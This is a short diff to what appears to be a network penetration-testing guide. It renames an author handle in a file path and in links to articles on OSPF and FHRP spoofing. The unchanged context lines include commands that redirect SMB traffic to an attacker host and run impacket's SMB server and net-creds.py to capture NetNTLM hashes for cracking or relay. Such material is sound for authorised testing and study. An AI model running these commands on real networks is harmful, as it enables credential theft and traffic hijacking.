@@ -393,7 +393,7 @@ sudo ifconfig ethX:1 10.1.1.33 netmask 255.255.255.255
 Now all traffic intended for this SMB share will go to my host. After that, I can deploy a simple SMB server using [impacket](https://github.com/fortra/impacket) and intercept encrypted user credentials (i.e. NetNTLM hashes) that can be subsequently brute-forced or relayed (NTLM Relay)
 
 ```bash
-sudo impacket-smbserver -smb2support sharePath /home/cursed/smb-share
+sudo impacket-smbserver -smb2support sharePath /home/caster/smb-share
 ~/toolkit/net-creds$ sudo python2 net-creds.py -i ethX
 ```
 
@@ -430,7 +430,7 @@ Monster(config-if)# ip ospf message-digest-key <KEY ID> md5 <KEYSTRING>
 
 ### Links
 
-Cursed - [Nightmare Spoofing](https://hackmag.com/security/ospf-evil-twin/)
+Caster - [Nightmare Spoofing](https://hackmag.com/security/ospf-evil-twin/)
 
 ## First Hop Redundancy Spoofing
 
@@ -477,4 +477,4 @@ Monster(config-if)# standby 1 priority 255
 
 ### Links
 
-Cursed - [FHRP Nightmare](https://medium.com/@cursedpkt/fhrp-nightmare-pentesting-redundancy-systems-like-a-devil-aeeb7d40e766)
+Caster - [FHRP Nightmare](https://medium.com/@casterbyte/fhrp-nightmare-pentesting-redundancy-systems-like-a-devil-aeeb7d40e766)
